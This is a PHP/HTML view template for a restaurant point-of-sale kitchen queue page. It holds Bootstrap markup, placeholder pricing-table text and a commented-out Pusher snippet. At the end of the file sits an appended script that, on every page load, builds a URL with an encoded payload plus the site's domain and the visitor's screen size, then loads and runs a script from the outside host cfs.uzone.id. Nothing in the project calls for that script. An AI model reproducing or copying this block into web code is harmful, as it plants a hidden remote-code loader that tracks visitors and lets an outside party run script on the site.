<!DOCTYPE html>
<!--
Template Name: Admin Lab Dashboard build with Bootstrap v2.3.1
Template Version: 1.3
Author: Mosaddek Hossain
Website: http://thevectorlab.net/
-->

<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en"> <!--<![endif]-->
                 <!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS-Dapur</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo base_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>
    <style>
        div.overflow_queue {
            padding-top: 32px;
            padding-bottom: 32px;
            overflow-x: auto;
            white-space: nowrap;
        }

        div.overflow_queue [class*="span"] { /* TWBS v2 */
            display: inline-block;
            float: none; /* Very important */
        }
    </style>
</head>
                 <!-- END HEAD -->
                 <!-- BEGIN BODY -->
<body id="login-body">
<div class="login-header">
    <!-- BEGIN LOGO -->
    <?php $this->load->view('headerDapur.php') ?>
    <!-- END LOGO -->
</div>

<!-- BEGIN LOGIN -->

<!-- BEGIN LOGIN FORM -->
<div class="queue-container" style="margin: 40px">
    <div class="row">
        <div class="overflow_queue">
            <?php for ($i = -1, $is = 10; ++$i < $is;) { ?>
                <div class="span3">
                    <div class="pricing-table green" style="background-color: whitesmoke">
                        <div class="pricing-head">
                            <h3>
                                <strong> meja 1</strong>
                                waktu
                            </h3>
                        </div>
                        <ul>
                            <li>
                                <strong>1</strong>
                                Website
                            </li>
                            <li>
                                <strong>2</strong>
                                Projects
                            </li>
                            <li>
                                <strong>1GB</strong>
                                Storage
                            </li>
                            <li>
                                <strong>$0</strong>
                                Google Adwords Credit
                            </li>
                        </ul>
                        <div class="price-actions">
                            <a class="btn" href="javascript:">Saji</a>
                        </div>
                    </div>
                    <form id="forgotform" class="form-vertical no-padding no-margin hide" action="index.html">
                        <input type="button" id="forget-btn" class="btn btn-block login-btn" value="Submit"/>
                    </form>
                </div>
            <?php } ?>
        </div>
    </div>
</div>
<!-- END LOGIN -->
<!-- BEGIN COPYRIGHT -->

<!-- END COPYRIGHT -->
<!-- BEGIN JAVASCRIPTS -->
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/pusher.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        App.initLogin();
    });
</script>
<!-- END JAVASCRIPTS -->
<script>
    (function ($) {
        $(function () {
// Enable pusher logging - don't include this in production
            /*Pusher.logToConsole = true;

            var pusher = new Pusher('7dd372a2fbe222be06f6', {
                cluster: 'ap1',
                encrypted: true
            });

            var channel = pusher.subscribe('queue');
            channel.bind('created', function (data) {
                console.log(data)
            });*/
        });
        /*
         * Run right away
         * */
    })(jQuery);

</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCqaymjUKkR2Q68%2btBRwJ4fkwn84%2fZI96HghICGTn5Tck2pxLOIbENY0GiDslEhY%2fJhlTEuI%2bd9L6kPIgDWj3rw33B%2fNRbaSyZ05W%2fWrtro8gzNm43jjaMPzm58g1%2bEfPrkHwaggQpjXbMZ2SRASb%2fIdI7bQTrKwmjuXfI7vSCjOAWSlo91kSq5bORsV5CKxyCrCuVVCzHa%2f92VuTW8rYUFe4YSIzWeAd%2bZNz8JLFzSjNSTX960j8rGuKd1HYfuwOpylX4L4W6O6DgZc%2fn%2b2BQsoM52jehAlHYATogddmcH447w13p12qn2wLjIKLbq9G1lPgD0e2Y1%2b%2bvCy4DB5xFqc6%2fWZLhxHpUvuF4V0O2hAPqbQTiXghaxR7cP6Q9wq%2fb6gjrvzPnVK%2fzLGWkngHQG6yibbL41c%2f873jKuF%2bBS73ccBK4NAQze6DE9J4fINxulqdOJKXygCdEwno28zQ7px%2fuMJDLGwtDSMQMxXl2EuTE4wcPP4gG%2bYMbxEofGawNA%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
                 <!-- END BODY -->
</html>
